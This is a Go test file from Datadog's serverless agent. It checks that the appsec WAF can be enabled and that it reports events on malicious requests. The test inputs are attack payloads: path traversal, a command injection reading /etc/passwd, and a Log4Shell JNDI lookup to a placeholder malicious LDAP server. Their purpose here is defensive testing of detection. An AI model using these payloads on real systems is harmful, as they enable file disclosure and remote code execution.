// Unless explicitly stated otherwise all files in this repository are licensed
// under the Apache License Version 2.0.
// This product includes software developed at Datadog (https://www.datadoghq.com/).
// Copyright 2016-present Datadog, Inc.

//go:build serverless
// +build serverless

package appsec_test

import (
	"testing"

	"github.com/DataDog/datadog-agent/pkg/serverless/appsec"
	"github.com/DataDog/go-libddwaf"
	"github.com/stretchr/testify/require"
)

func TestNew(t *testing.T) {
	if err := waf.Health(); err != nil {
		t.Skip("host not supported by appsec", err)
	}

	t.Run("appsec disabled", func(t *testing.T) {
		t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", "false")
		asm, _ := appsec.New()
		require.Nil(t, asm)
	})

	t.Run("appsec enabled", func(t *testing.T) {
		t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", "true")
		asm, err := appsec.New()
		require.NoError(t, err)
		require.NotNil(t, asm)
	})
}

func TestMonitor(t *testing.T) {
	if err := waf.Health(); err != nil {
		t.Skip("host not supported by appsec", err)
	}

	t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", "true")
	asm, err := appsec.New()
	require.NoError(t, err)
	require.Nil(t, err)

	uri := "/path/to/resource/../../../../../database.yml.sqlite3"
	addresses := map[string]interface{}{
		"server.request.uri.raw": uri,
		"server.request.headers.no_cookies": map[string][]string{
			"user-agent": {"sql power injector"},
		},
		"server.request.query": map[string][]string{
			"query": {"$http_server_vars"},
		},
		"server.request.path_params": map[string]string{
			"proxy": "/path/to/resource | cat /etc/passwd |",
		},
		"server.request.body": "eyJ0ZXN0I${jndi:ldap://16.0.2.staging.malicious.server/a}joiYm9keSJ9",
	}
	events := asm.Monitor(addresses)
	require.NotNil(t, events)
}
